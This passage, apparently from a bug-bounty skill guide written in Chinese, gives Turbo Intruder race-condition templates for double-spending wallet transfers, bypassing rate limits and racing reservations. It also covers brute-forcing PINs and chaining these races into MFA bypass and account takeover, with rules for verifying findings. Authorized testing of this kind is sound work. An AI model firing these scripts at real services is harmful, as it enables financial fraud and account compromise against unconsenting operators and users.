# Use against: wallet transfer (withdraw-to-A + deposit-to-B),
#              balance-confirm race, double-spend across endpoints
# Strategy: Race two different endpoints that share state (common in fintech).
# Queue requests in alternating order so they arrive simultaneously.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2,
    )

    # Request 1: withdraw from account A (requires target A's endpoint base)
    # Request 2: deposit to account B
    # Alternate so the server processes both in the same scheduler tick
    transfer_req = b'POST /api/transfer HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{"from": "acc_A", "to": "acc_B", "amount": 1000, "nonce": "RACE_NONCE"}'

    confirm_req = b'POST /api/confirm-transfer HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{"transfer_id": "RACE_NONCE", "confirm": true}'

    # Queue interleaved
    for i in range(15):
        engine.queue(transfer_req.replace(b'RACE_NONCE', str(i).encode()), gate='race1')
        engine.queue(confirm_req.replace(b'RACE_NONCE', str(i).encode()), gate='race2')

    # Release both gates simultaneously
    engine.openGate('race1')
    engine.openGate('race2')
    engine.complete(timeout=15)


def handleResponse(req, interesting):
    table.add(req)
```

### 模板 4：通过竞态绕过速率限制

```python
# turbo_rate_limit_bypass.py
# Use against: endpoints with per-minute/per-second rate caps
# Strategy: N concurrent requests from the same session/IP all pass
# the rate-limit check before any increments the counter.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2,
    )

    # Queue enough requests to exhaust the rate-limit window + extras
    for i in range(100):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=10)


def handleResponse(req, interesting):
    # Compare responses — if first N succeed then rate-limit kicks in,
    # the race is partial. If ALL return 200, rate limiter is completely
    # bypassed by the concurrent batch.
    if req.status == '200':
        table.add(req)
    elif req.status == '429':
        interesting = True  # Mark the rate-limit boundary
        table.add(req)
```

### 模板 5：顺序门控竞态（延迟窗口 / 多步骤）

```python
# turbo_sequential_gates.py
# Use against: Deferred race windows (action creates a temporary state
# that must be raced before cleanup), multi-step flows
# Strategy: Gate 1 opens N actions. Gate 2 opens M consuming actions.
# Both fire in the same TCP write.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2,
    )

    # Gate 1: Create the resource
    create_req = b'POST /api/create-reservation HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{"item_id": "LIMITED_ITEM", "qty": 1}'

    # Gate 2: Claim the resource (must arrive before cleanup)
    claim_req = b'POST /api/claim-reservation HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{"reservation_id": "RACE_ID"}'

    for i in range(20):
        engine.queue(create_req, gate='race1')

    for i in range(20):
        engine.queue(claim_req, gate='race2')

    # Both gates release simultaneously
    engine.openGate('race1')
    engine.openGate('race2')
    engine.complete(timeout=15)


def handleResponse(req, interesting):
    table.add(req)
```

### 模板 6：竞态窗口测量探针

```python
# turbo_probe_window.py
# Use BEFORE the actual exploit to estimate the race window size.
# Measures response times for serial vs concurrent requests.

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=10,
        engine=Engine.BURP2,
    )

    # Single request — baseline
    engine.queue(target.req, label='baseline')

    # 5 concurrent — test parallelism
    for i in range(5):
        engine.queue(target.req, label='race_test', gate='probe')

    engine.openGate('probe')
    engine.complete(timeout=10)


def handleResponse(req, interesting):
    table.add(req)
    # After run: compare req.time on 'baseline' vs 'race_test' labels.
    # If race_test times ≈ baseline, server parallelizes → good for race.
    # If race_test times = baseline × count, server serializes → harder race.
```

### 使用说明：
1. 打开 Burp → Extensions → Turbo Intruder → 将请求发送到 Turbo Intruder
2. 用上述任一模板替换默认脚本
3. 根据期望的并发量调整 `N`（range 上界）
4. HTTP/2 时设置 `engine=Engine.BURP2`；HTTP/1.1 回退时移除该行
5. 点击 "Attack" — 在表格窗格中观察结果
6. PIN 暴力破解：离线生成所有候选，分成约 50-100 个批次
7. Wireshark 验证：攻击运行期间执行 `sudo tcpdump -i any -w race.pcap port 443`

### 引擎对比：
| 引擎 | 协议 | 竞态窗口 | 使用场景 |
|--------|----------|-------------|----------|
| `Engine.BURP2` | HTTP/2 | <1ms（单包） | 默认 — 最快、最可靠 |
| `Engine.HTTP2` | HTTP/2 | ~5-10ms（无 last-byte sync） | BURP2 不可用时 |
| `Engine.THREADED` | HTTP/1.1 | ~50-200ms | 非 H2 目标的回退方案 |
| `Engine.LEGACY` | HTTP/1.1 | ~100-500ms | 遗留/阻塞式后端 |

### 组合 Flatt 首序列同步方法（10,000+ 请求）：
用于 PIN 暴力破解（在 <200ms 内尝试 10,000 个候选）：
```python
# Pseudocode — full implementation per Flatt Security research:
# 1. Open N TCP connections (N = fragment count)
# 2. Synchronize TCP SEQ numbers across all connections
# 3. Queue M requests per connection (total = N × M = 10,000)
# 4. Release all final bytes across ALL connections simultaneously
#    using kernel-level TCP_COOKIE or IP_MTU_DISCOVER tricks
# 5. Server receives all 10,000 in the same IP-processing window
```
参见：https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/

---

## Pitfalls
- **单线程测试** — 竞态条件需要并行请求。仅用 curl 无法可靠地证明它们。使用 Python `asyncio` 或多线程的 Burp Intruder。
- **没有状态变化的 TOCTOU** — 如果不证明状态在检查与使用之间发生了变化，time-of-check-time-of-use 只是理论上的。
- **竞态窗口太小** — 如果检查与使用之间的窗口只有微秒级，竞态可能不切实际。报告之前先测量窗口。
- **限额超发竞态** — 优惠券/信用/提现竞态是影响最高的。用精确的并行请求测试，而不仅仅是快速顺序请求。

---

## Verification

- 每个被提升为发现的结论都说明了预期行为、观察到的响应，以及排除误报的阴性对照。
- 影响以所需的最小状态变化来证明；仅有状态码、banner 或扫描器标签不构成发现。
- 请求、响应、UTC 时间戳和工具版本记录在 `${OUTPUT_DIR:-./output}` 下，以便审阅者复现该主张。

---

## 相关技能与链路

- **`hunt-business-logic`** — 竞态条件是每个业务逻辑状态机的“并发臂”。链路原语：业务逻辑（优惠券/促销）+ 竞态条件单包攻击 → 优惠券被核销 N 次 → 直接财务损失。
- **`hunt-mfa-bypass`** — OTP 过期窗口和重放防护是经典的竞态目标。链路原语：竞态 + MFA 校验端点 → 在有效窗口内提交 N 个并发校验，绕过 OTP 过期。
- **`hunt-ato`** — 密码重置、邮箱变更和账户创建上的竞态条件可实现持久化 ATO。链路原语：竞态邮箱变更端点 + 缺少原子更新 → 换掉受害者邮箱 + 在用户察觉前读取重置令牌。
- **`hunt-api-misconfig`** — 没有原子 UPDATE 的钱包/余额/信用端点是重复消费的候选。链路原语：竞态 + 缺少原子更新 → 重复消费余额 → 提取用户 N 倍余额。
- **`security-arsenal`** — 加载 Turbo Intruder 单包模板、用于原子提交的 h2.cl 走私，以及 `curl --next` 并行多请求模式。
- **`triage-validation`** — 应用统计采样门槛：单个异常响应只是噪声；在报告前需要 1 次成功 + N 次重复 / 超配额 / 过期状态演示，并附响应截图。

### Phase X — 连接预热与数据库隔离

连接预热：在开始竞态之前建立 TCP+TLS；使用 `curl --parallel` 同时发送。
Last-byte sync：在 HTTP/2 上使用 Turbo Intruder `engine=Engine.BURP2` 实现单包送达。
数据库隔离：READ COMMITTED 允许 SELECT 与 UPDATE 之间出现幻读 — 用 N 个同时的消费/提现请求测试。
通过别名实现 GraphQL 并行 mutation：`mutation { a: redeem B: redeem c: redeem }` — 绕过顺序执行。
